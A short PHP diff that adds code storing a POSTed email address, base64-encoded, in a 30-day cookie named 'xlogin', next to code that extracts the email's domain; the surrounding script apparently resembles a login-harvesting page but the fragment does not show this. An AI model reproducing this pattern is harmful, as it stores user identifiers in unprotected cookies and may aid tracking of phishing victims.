@@ -360,7 +360,11 @@ closedir($dir);
 }
 
 $email = strtolower($_POST['token']);
-
+///
+$cookie_name = "xlogin";
+$cookie_value = base64_encode($email);
+setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day
+///
 $atdomain = strstr($email, '@');
 $domain = str_replace("@","",$atdomain);
 
